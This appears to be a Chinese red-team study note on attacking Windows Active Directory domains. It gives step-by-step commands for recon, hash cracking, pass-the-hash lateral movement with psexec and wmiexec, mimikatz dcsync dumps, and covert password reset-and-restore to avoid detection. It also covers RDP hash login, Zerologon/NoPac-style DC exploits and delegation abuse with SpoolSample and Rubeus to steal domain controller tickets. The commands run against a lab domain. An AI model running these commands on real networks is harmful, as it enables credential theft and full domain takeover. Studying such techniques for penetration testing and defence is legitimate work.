<p>net time &#x2F;domain等</p>
<h2 id="域信息收集"><a href="#域信息收集" class="headerlink" title="域信息收集"></a>域信息收集</h2><h3 id="连接域控LDAP"><a href="#连接域控LDAP" class="headerlink" title="连接域控LDAP"></a>连接域控LDAP</h3><p>ADExplorer</p>
<p>可以利用这个工具连接到域控的LDAP可以根据OU去定位关键部门，关键人员，比如运维人员，或者去查看一些敏感资料</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230809101831741.png"
                      alt="image-20230809101831741"
                ></p>
<h3 id="用户凭据收集"><a href="#用户凭据收集" class="headerlink" title="用户凭据收集"></a>用户凭据收集</h3><p>域内单机密码和哈希值</p>
<p>rdp凭据</p>
<p>浏览器的信息</p>
<p>xshell&#x2F;navicat</p>
<h3 id="BloodHound"><a href="#BloodHound" class="headerlink" title="BloodHound"></a>BloodHound</h3><p>BloodHound是一款强大的域内环境分析工具</p>
<p><a class="link"   href="https://github.com/BloodHoundAD/BloodHound" >https://github.com/BloodHoundAD/BloodHound <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>通过一款工具可以即将ADExpolorer生成的导出文件转换成BloodHound可解析的格式</p>
<p><a class="link"   href="https://github.com/c3c/ADExplorerSnapshot.py" >https://github.com/c3c/ADExplorerSnapshot.py <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>然后就可以利用这个工具进行域内分析</p>
<h2 id="域内横向移动"><a href="#域内横向移动" class="headerlink" title="域内横向移动"></a>域内横向移动</h2><h3 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h3><p>利用wiki、密码本，抓取本机hash、rdp凭据等信息</p>
<p>可以利用口令复用&#x2F;pth哈希传递</p>
<p>也可以生成密码字典碰撞</p>
<h3 id="PTH"><a href="#PTH" class="headerlink" title="PTH"></a>PTH</h3><p>windows2012之后系统默认关闭wigest，攻击者无法从内存中获取明文密码，2012之前的版本如果安装KB2871997补丁。也会导致这样</p>
<h4 id="hashcat"><a href="#hashcat" class="headerlink" title="hashcat"></a>hashcat</h4><p>所以有一种方法就是我们可以利用hashcat对获取到的hash进行爆破</p>
<p>—爆破命令：hashcat -a 0 -m 1000 hash file –force</p>
<p>—-a, –attack-mode&#x3D;NUM         攻击模式，其值参考后面对参数。“-a 0”字典攻击，“-a 1” 组合攻击；“-a 3”掩码攻击。（这里是字典攻击）</p>
<p>— -m 1000指向的是NTLM Hash哈希协议</p>
<p>—hash是要破解的哈希字符串，file为字典的地址</p>
<h4 id="impacket"><a href="#impacket" class="headerlink" title="impacket"></a>impacket</h4><h6 id="psexec-py"><a href="#psexec-py" class="headerlink" title="psexec.py"></a>psexec.py</h6><p>利用smb服务可以通过明文或者hash传递来远程执行，必要条件是445端口要开启和Admin$共享</p>
<p>主要连接到SMB服务端的Admin$共享，并且释放psexesvc.exe，注册PSEXESVC服务，然后通过PSEXESVC服务进行命令执行</p>
<p>简要来说就是用这些工具来远程得到目标主机的system权限</p>
<p>存在两种连接方式：</p>
<ol>
<li>先有 ipc 链接，psexec 需要明文或hash 传递</li>
</ol>
<p>先建立ipc连接：<code>net use \\192.168.30.10\ipc$ &quot;Admin!@#45&quot; /user:administrator（密码是前期信息收集获取）</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230813161448876.png"
                     
                ></p>
<p>然后利用psexec打开cmd，运行即可</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">psexec \\192.168.3.32 -s cmd</span><br></pre></td></tr></table></figure></div>

<p>2.不用建立IPC直接提供明文账户密码（推荐原因：建立IPC链接可能会失败）</p>
<p><code>psexec --accepteula \\192.168.3.21 -u（用户） administrator -p（密码） Admin12345 -s（系统权限） cmd（运行cmd） </code></p>
<p>如果没有明文密码，只有hash密码的话官方的pstools不能使用，这时候就需要使用impacket中别人二改的psexec.exe</p>
<p>psexec.exe -hashes :518b98ad4178a53695dc997aa02d455c .&#x2F;<a class="link"   href="mailto:&#x61;&#x64;&#x6d;&#x69;&#x6e;&#x69;&#x73;&#x74;&#x72;&#97;&#x74;&#x6f;&#114;&#64;&#x31;&#57;&#x32;&#46;&#x31;&#x36;&#56;&#x2e;&#x33;&#46;&#51;&#x32;" >&#x61;&#x64;&#x6d;&#x69;&#x6e;&#x69;&#x73;&#x74;&#x72;&#97;&#x74;&#x6f;&#114;&#64;&#x31;&#57;&#x32;&#46;&#x31;&#x36;&#56;&#x2e;&#x33;&#46;&#51;&#x32; <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> </p>
<h6 id="wmiexec-py"><a href="#wmiexec-py" class="headerlink" title="wmiexec.py"></a>wmiexec.py</h6><p><code>wmiexec HACK-MY/Administrator:Admin!@#45@192.168.30.10</code>连接域内主机，就可以远程命令控制</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230317202047275.png"
                      alt="image-20230317202047275"
                ></p>
<h6 id="atexec-py"><a href="#atexec-py" class="headerlink" title="atexec.py"></a>atexec.py</h6><h4 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h4><p>提权</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230813163332126.png"
                      alt="image-20230813163332126"
                ></p>
<p>如何获取密码</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230813163407947.png"
                      alt="image-20230813163407947"
                ></p>
<h4 id="xfreerdp"><a href="#xfreerdp" class="headerlink" title="xfreerdp"></a>xfreerdp</h4><h3 id="中继"><a href="#中继" class="headerlink" title="中继"></a>中继</h3><h3 id="知道ntlm如何修改原有的账户密码"><a href="#知道ntlm如何修改原有的账户密码" class="headerlink" title="知道ntlm如何修改原有的账户密码"></a>知道ntlm如何修改原有的账户密码</h3><h4 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h4><p>1.拿下域控之后，获取到运维人员的hash，但是解密不出明文密码，但是需要明文密码登陆一些核心系统，如邮件服务器，堡垒机，使用域身份认证的系统</p>
<p>2.拿下域控之后，目标机器只能通3389，445等端口不通（PTH行不通），想上去翻看文件</p>
<p>3.拿下域控之后，获取到所有域用户的hash，发现内网中的云桌面（员工使用云桌面办公）走域认证，想登陆云桌面上去翻看文件，但是很多hash解密不出明文密码</p>
<p>注意：通过域管&#x2F;域控去直接修改对应用户的密码，但是容易被发现密码被修改了</p>
<p>解决方案：登陆目标系统之后，再将目标密码还原</p>
<h6 id="mimikatz-1"><a href="#mimikatz-1" class="headerlink" title="mimikatz"></a>mimikatz</h6><p>通过mimikatz的setntlm重置密码，然后再还原</p>
<p>先查看目标用户的hash值</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">lsadump::dcsync /domain:hack-my.com /all /csv</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230813163553614.png"
                      alt="image-20230813163553614"
                ></p>
<p>administartor的密码hash是38fe728ae616f0fde13715e7c320685f</p>
<p>重置密码</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">lsadump::setntlm /server:&lt;域控IP或完整域名&gt; /user:&lt;username&gt; /password:&lt;新的密码&gt;</span><br></pre></td></tr></table></figure></div>

<p>lsadump::setntlm &#x2F;server:192.168.30.10 &#x2F;user:administrator &#x2F;password:123456</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230813164136598.png"
                      alt="image-20230813164136598"
                ></p>
<p>然后就可以利用修改后的密码登入系统，密码为123456成功登陆进去</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230813164304054.png"
                      alt="image-20230813164304054"
                ></p>
<p>登陆目标系统后，再通过以下命令还原密码</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">lsadump::setntlm /server:&lt;域控IP或完整域名&gt; /user:&lt;username&gt; /ntlm:&lt;ntml hash值&gt;</span><br></pre></td></tr></table></figure></div>

<p>lsadump::setntlm &#x2F;server:192.168.30.10 &#x2F;user:administrator &#x2F;ntlm:38fe728ae616f0fde13715e7c320685f</p>
<p>成功改回来了，但是系统会话还是保持的并不会让我们重新登陆</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230813164438706.png"
                      alt="image-20230813164438706"
                ></p>
<h3 id="通过HASH登陆RDP—解不出hash怎么办"><a href="#通过HASH登陆RDP—解不出hash怎么办" class="headerlink" title="通过HASH登陆RDP—解不出hash怎么办"></a>通过HASH登陆RDP—解不出hash怎么办</h3><h4 id="场景-1"><a href="#场景-1" class="headerlink" title="场景"></a>场景</h4><p>获取某用户的NTLM HASH，但是解密不出明文密码，目标机器只能通3389</p>
<p>如果使用hash远程登录RDP，服务端需要开启”Restricted Admin Mode”</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">REG ADD &quot;HKLM\System\CurrentControlSet\Control\Lsa”/v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">REG query &quot;HKLM\System\CurrentControlSet\Control\Lsa&quot; | findstr &quot;DisableRestrictedAdmin&quot;</span><br></pre></td></tr></table></figure></div>

<p>&#x2F;&#x2F;0x0代表开启</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230813165735129.png"
                      alt="image-20230813165735129"
                ></p>
<p>mimikatz</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">privilege::Debug</span><br><span class="line">sekurlsa::pth /user:用户名 /domain:hack-my.com /ntlm:ntlm hash值 &quot;/run:mstsc.exe/restrictedadmin&quot;</span><br></pre></td></tr></table></figure></div>

<p>sekurlsa::pth &#x2F;user:administrator &#x2F;domain:hack-my.com &#x2F;ntlm:38fe728ae616f0fde13715e7c320685f “&#x2F;run:mstsc.exe&#x2F;restrictedadmin”</p>
<p>不清楚为什么失败了，之后再看看</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230813170132283.png"
                      alt="image-20230813170132283"
                ></p>
<p>xfreerdp</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">xfreerdp /u:用户名 /d:hack-my.com /pth:hash值 /v:172.23.119.83</span><br></pre></td></tr></table></figure></div>

<h2 id="攻击域控方式"><a href="#攻击域控方式" class="headerlink" title="攻击域控方式"></a>攻击域控方式</h2><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h4 id="MS14068"><a href="#MS14068" class="headerlink" title="MS14068"></a>MS14068</h4><p>前提：需要一个域用户</p>
<p>使普通用户提权到域控权限的权限提升漏洞</p>
<h4 id="zerologon（CVE-2020-1472）"><a href="#zerologon（CVE-2020-1472）" class="headerlink" title="zerologon（CVE-2020-1472）"></a>zerologon（CVE-2020-1472）</h4><p>未经身份认证的攻击者可通过使用Netlogon远程协议（MS-NRPC）连接域控来利用此漏洞，成功利用此漏洞的攻击者可获得域管理员权限</p>
<h4 id="NoPac（CVE-2021-42278-CVE-2021-42287）"><a href="#NoPac（CVE-2021-42278-CVE-2021-42287）" class="headerlink" title="NoPac（CVE-2021-42278+CVE-2021-42287）"></a>NoPac（CVE-2021-42278+CVE-2021-42287）</h4><p>前提：需要一个域用户</p>
<p>获取域控权限</p>
<h4 id="ADCS（CVE-2022-26923）"><a href="#ADCS（CVE-2022-26923）" class="headerlink" title="ADCS（CVE-2022-26923）"></a>ADCS（CVE-2022-26923）</h4><p>允许低权限用户再安装了AD证书服务（AD CS）服务器角色的AD环境中将权限提升至域管理员</p>
<p>前提：判断是否存在证书服务器</p>
<p>需要一个域用户</p>
<h4 id="printNifhtmare（CVE-2021-1675、CVE-2021-34527）"><a href="#printNifhtmare（CVE-2021-1675、CVE-2021-34527）" class="headerlink" title="printNifhtmare（CVE-2021-1675、CVE-2021-34527）"></a>printNifhtmare（CVE-2021-1675、CVE-2021-34527）</h4><p>前提：需要一个域用户、域控能访问到跳板机的smb匿名共享</p>
<p>获取域控权限</p>
<h3 id="委派"><a href="#委派" class="headerlink" title="委派"></a>委派</h3><h4 id="非约束性委派"><a href="#非约束性委派" class="headerlink" title="非约束性委派"></a>非约束性委派</h4><p>当一个服务账号&#x2F;机器账号设置了非约束性委派属性后，如果有用户认证使用了该服务，那么后续就可以通过该服务去伪造用户的权限</p>
<p>当servicel的服务账户开启了非约束委派之后，user访问servicel时候，servicel会将user的TGT保存在内存中，然后servicel就可以利用TGT以user的身份去访问域中任何user可以访问的服务</p>
<h5 id="查找方法"><a href="#查找方法" class="headerlink" title="查找方法"></a>查找方法</h5><p>查询域内设置了非约束性委派的服务账户</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">AdFind.exe -b &quot;DC=hack-my,DC=com&quot; -f &quot;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; dn</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230813172344806.png"
                      alt="image-20230813172344806"
                ></p>
<p>查询域内设置了非约束性委派的机器账户</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">AdFind.exe -b &quot;DC=hack-my,DC=com&quot; -f &quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; dn</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230813172450287.png"
                      alt="image-20230813172450287"
                ></p>
<h5 id="攻击手法"><a href="#攻击手法" class="headerlink" title="攻击手法"></a>攻击手法</h5><h6 id="被动"><a href="#被动" class="headerlink" title="被动"></a>被动</h6><p>让域管理员连接设置了非约束委派的服务</p>
<p>设置Alice为非约束委派</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230813181147179.png"
                      alt="image-20230813181147179"
                ></p>
<p>查询域内设置了非约束委派的服务账户</p>
<p>Alice上执行</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">AdFind.exe -b &quot;DC=hack-my,DC=com&quot; -f &quot;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; dn</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230813181607999.png"
                      alt="image-20230813181607999"
                ></p>
<p>查询域内设置了非约束委派的机器账户</p>
<p>执行</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">AdFind.exe -b &quot;DC=hack-my,DC=com&quot; -f &quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; dn</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230813181742730.png"
                      alt="image-20230813181742730"
                ></p>
<h6 id="接下来开始攻击-利用1"><a href="#接下来开始攻击-利用1" class="headerlink" title="接下来开始攻击  利用1"></a>接下来开始攻击  利用1</h6><p>可以让域管理员访问被控主机</p>
<p>前提：找到配置了非约束委派的机器Alice并获得了管理员权限</p>
<p>到域控执行，让域管理员访问Alice，就会在Alice主机中产生TGT票据</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">net use \\Alice.hack-my.com</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230813182226695.png"
                      alt="image-20230813182226695"
                ></p>
<p>然后Alice利用mimikatz导出保存的票据，发现具有administrator的票据</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::tickets /export&quot; exit</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230813182340010.png"
                      alt="image-20230813182340010"
                ></p>
<p>然后就利用下面这个命令，使用这个导出的票据</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz.exe &quot;kerberos::ptt [0;3fe27c]-2-1-40e10000-Administrator@krbtgt-HACK-MY.COM.kirbi&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230813183052518.png"
                      alt="image-20230813183052518"
                ></p>
<p>好像报错了，但是连接是可以建立的</p>
<p>通过连接，即可访问dc的目录</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">dir \\dc.hack-my.com\c$</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230813183251293.png"
                      alt="image-20230813183251293"
                ></p>
<p>这种方式在实战情况下，除非域管理员连接过该服务，否则十分的鸡肋</p>
<p>通过社工钓鱼等方式让域管主动去访问设置了非约束委派的服务的机器</p>
<p>比如WinRM服务远程连接或者域管理员账号登录目标主机等</p>
<h6 id="利用spooler打印机服务让域控主动连接"><a href="#利用spooler打印机服务让域控主动连接" class="headerlink" title="利用spooler打印机服务让域控主动连接"></a>利用spooler打印机服务让域控主动连接</h6><p>在spooler服务默认开启的情况下，域用户可以利用Windows打印系统远程协议强制任何运行了spooler服务的域内主机就通过kerberos或者NTLM对任何目标进行身份验证</p>
<p>主要原理就是强迫运行打印机服务（Print Spooler）的主机向目标主机发起Kerberos或者NTLM认证请求</p>
<p>因为在Spooler服务默认开启的情况下，域用户可以利用windows打印机系统远程协议（MS-RPRN）强制任何运行了Spooler服务的域内计算机通过Kerberos或NTLM对任何目标进行认证</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">需要</span><br><span class="line">administrator权限</span><br><span class="line">得到域用户的账户密码</span><br><span class="line">域控打开打印机服务</span><br></pre></td></tr></table></figure></div>

<p><strong>攻击流程</strong></p>
<p>首先域控得先打开打印机服务</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sc query spooler</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230813184424791.png"
                      alt="image-20230813184424791"
                ></p>
<p>有一种是直接运行SpoolSample</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">spoolsample.exe DC Alice</span><br><span class="line"># 表示利用打印服务强制让域控机向Alice主机验证身份</span><br></pre></td></tr></table></figure></div>



<p>还有一种是利用rubeus进行的</p>
<p>先利用Rubeus在域用户主机上运行，需要本地管理员权限</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Rubeus.exe monitor /interval:1 /filteruser:DC$</span><br><span class="line"># 我们可以用Rubeus来监听Event ID为4624事件，这样可以第一时间截取到域控的TGT</span><br><span class="line"># /interval:1 设置监听间隔1秒</span><br><span class="line"># /filteruser 监听对象为我们的域控，注意后面有个$，如果不设置监听对象就监听所有的TGT</span><br><span class="line"># DC$为域控的主机名字加$</span><br></pre></td></tr></table></figure></div>

<p>这边主机环境有问题暂时运行不起来</p>
<p>上个贴图吧</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/2e69c11052ca3f45e6ed166b0a86ed8f.png"
                      alt="img"
                ></p>
<p>然后需要利用SpoolSample让域控强制向本机进行身份验证</p>
<p>需要以域用户身份运行</p>
<p>然后运行</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">spoolsample.exe DC Alice</span><br><span class="line"># 表示利用打印服务强制让域控机向Alice主机验证身份，这样我们的Rubeus就可以监听到TGS了</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/ea7756068b739208f63908f1a2c2e4d0.png"
                      alt="img"
                ></p>
<p>这个加了换行，所以可以用python去掉换行</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">data=&quot;&quot;</span><br><span class="line">for line in open(&#x27;1.txt&#x27;,&#x27;r&#x27;):</span><br><span class="line">    data += line.strip(&#x27;\n&#x27;)</span><br><span class="line">with open(&quot;2.txt&quot;,&#x27;a&#x27;) as f:</span><br><span class="line">    f.write(data)</span><br><span class="line">print(&#x27;保存完毕&#x27;)</span><br></pre></td></tr></table></figure></div>

<p>复制2.txt中的TGT</p>
<p>本地管理员权限运行</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Rubeus.exe ptt /ticket: 2.txt中的TGT值</span><br></pre></td></tr></table></figure></div>

<p>然后mimikatz执行，就可以获取krbtgt的NTLM hash值了</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz.exe &quot;lsadump::dcsync /domain:hack-my.com /all /csv&quot; exit</span><br></pre></td></tr></table></figure></div>

<p>然后也能用smbexec.py获取域控权限</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">python smbexec.py -hashes :NTLM-HASH administrator@192.168.30.10</span><br></pre></td></tr></table></figure></div>



<h4 id="约束性委派"><a href="#约束性委派" class="headerlink" title="约束性委派"></a>约束性委派</h4><p>由于非约束委派的不安全性，微软在win2003中发布了约束委派功能，对Kerberos协议进行了拓展，引入了S4U协议：S4U2Self和S4U2proxy。</p>
<h6 id="S4U2Self：用于生成本身服务ST票据"><a href="#S4U2Self：用于生成本身服务ST票据" class="headerlink" title="S4U2Self：用于生成本身服务ST票据"></a>S4U2Self：用于生成本身服务ST票据</h6><p>允许受约束委派的服务代表任意用户向KDC请求服务自身，从而获得一张该用户的对当前受约束委派服务的票据ST，该服务票据ST包含了用户的相关信息，如用户的信息组等</p>
<h6 id="S4U2proxy：保证只能访问特定服务（最大区别）"><a href="#S4U2proxy：保证只能访问特定服务（最大区别）" class="headerlink" title="S4U2proxy：保证只能访问特定服务（最大区别）"></a>S4U2proxy：保证只能访问特定服务（最大区别）</h6><p>允许受约束委派的服务通过服务票据ST，然后代表用户去请求指定的服务</p>
<p>在约束委派中，用户还是会将TGT发送给相关受委派的服务，但是由于S4U2proxy的影响，对发送给受委派的服务去访问其他服务作了限制</p>
<p>他不允许受委派的服务代表用户使用这个TGT去访问任意服务，而只能访问指定服务</p>
<p>在S4U2proxy过程会通过判断msds-allowedtodelegateto里的SPN值来确定是否可以申请到service2的ST</p>
<h5 id="攻击手法-1"><a href="#攻击手法-1" class="headerlink" title="攻击手法"></a>攻击手法</h5><p>设置了约束委派的服务账户&#x2F;机器账户能访问域控服务，如CISF</p>
<h5 id="查找方法-1"><a href="#查找方法-1" class="headerlink" title="查找方法"></a>查找方法</h5><h6 id="查询域内设置了约束委派的服务账户"><a href="#查询域内设置了约束委派的服务账户" class="headerlink" title="查询域内设置了约束委派的服务账户"></a>查询域内设置了约束委派的服务账户</h6><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">AdFind.exe -b &quot;DC=hack-my,DC=com&quot; -f &quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot; msds-allowedtodelegateto</span><br></pre></td></tr></table></figure></div>

<h6 id="查询域内设置了约束委派的机器账户"><a href="#查询域内设置了约束委派的机器账户" class="headerlink" title="查询域内设置了约束委派的机器账户"></a>查询域内设置了约束委派的机器账户</h6><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">AdFind.exe -b &quot;DC=hack-my,DC=com&quot; -f &quot;(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))&quot; msds-allowedtodelegateto</span><br></pre></td></tr></table></figure></div>

<h4 id="基于资源的委派"><a href="#基于资源的委派" class="headerlink" title="基于资源的委派"></a>基于资源的委派</h4><p>简单来说就是一台机器的服务资源（如CIFS服务）可以通过设置msDS-AllowedToActOnBehalfOfOtherIdentity属性指向一个委派账户，被委派的账户即可拥有访问该服务的权限</p>
<p>原理：如果获取了一个用户A权限，用户A对机器B具有修改msDS-AllowedToActOnBehalfOfOtherIdentity属性的权限，那么可以通过修改B的这个属性，修改为具有SPN的账户C的SID，再使用账户C的权限伪造S4U请求去申请机器B的CIFS服务的ST即可访问CIFS服务</p>
<h5 id="谁可以修改这台机器的该属性"><a href="#谁可以修改这台机器的该属性" class="headerlink" title="谁可以修改这台机器的该属性"></a>谁可以修改这台机器的该属性</h5><ol>
<li>将机器加入域的域用户</li>
<li>Account Operator组成员</li>
<li>该主机的机器账户本身</li>
</ol>
<p>限制：只能在win2012及以上版本的域控才可以，08以下没有这个属性</p>
<h5 id="查找方法-2"><a href="#查找方法-2" class="headerlink" title="查找方法"></a>查找方法</h5><h6 id="哪个用户把这个机器加入域"><a href="#哪个用户把这个机器加入域" class="headerlink" title="哪个用户把这个机器加入域"></a>哪个用户把这个机器加入域</h6><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">AdFind.exe -h 192.168.30.20（域控IP） -b &quot;DC=hack-my,DC=com&quot; -f &quot;objectClass=computer&quot; mS-DS-CreatorSID</span><br></pre></td></tr></table></figure></div>

<h6 id="查询某个用户把哪些机器加入域"><a href="#查询某个用户把哪些机器加入域" class="headerlink" title="查询某个用户把哪些机器加入域"></a>查询某个用户把哪些机器加入域</h6><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Import-Module .\powerview.ps1 Get-DomainUser -Identity addUser -Properties objectsid</span><br></pre></td></tr></table></figure></div>

<h5 id="攻击手法-2"><a href="#攻击手法-2" class="headerlink" title="攻击手法"></a>攻击手法</h5><p>获取服务器权限</p>
<p>Account Operators组用户拿下主机</p>
<p>结合NTLM Relay接管域控（CVE-2019-1040）</p>
<p>委派部分的将会单独做出复现笔记</p>
<h3 id="NTLM"><a href="#NTLM" class="headerlink" title="NTLM"></a>NTLM</h3><h4 id="发起NTLM请求"><a href="#发起NTLM请求" class="headerlink" title="发起NTLM请求"></a>发起NTLM请求</h4><h5 id="攻击手法-3"><a href="#攻击手法-3" class="headerlink" title="攻击手法"></a>攻击手法</h5><p>使受害机器自动使用当前用户凭据向恶意服务器发起NTLM认证</p>
<p>拿到hash值之后利用hashcat进行爆破</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">hashcat.exe -m 5600 hash.txt pass.txt --force</span><br></pre></td></tr></table></figure></div>



<h6 id="PrinterBug"><a href="#PrinterBug" class="headerlink" title="PrinterBug"></a>PrinterBug</h6><p>任何经过身份验证的域成员都可以连接到远程服务器的打印服务（spoolsv.exe），并请求对一个新的打印作业进行更新，令其将该通知发给指定目标。之后会将立即测试该连接，即向指定目标进行身份验证（攻击者可以选择通过Kerberos或NTLM进行验证）并且，由于Print Spooler服务以SYSTEM账户的身份运行，因此最后截获的使目标机器账户的Net-NTLM Hash</p>
<p>前提：需要一个域用户，目标机器开启Print Spooler服务</p>
<h6 id="PetitPatam漏洞"><a href="#PetitPatam漏洞" class="headerlink" title="PetitPatam漏洞"></a>PetitPatam漏洞</h6><p>Windows操作系统中一个新发现的安全漏洞可被利用来强制远程Windows服务器（包括域控）向恶意目的地进行身份验证，从而允许攻击者发起NTLM中继攻击并完全接管Windows域</p>
<p>前提：需要一个域用户</p>
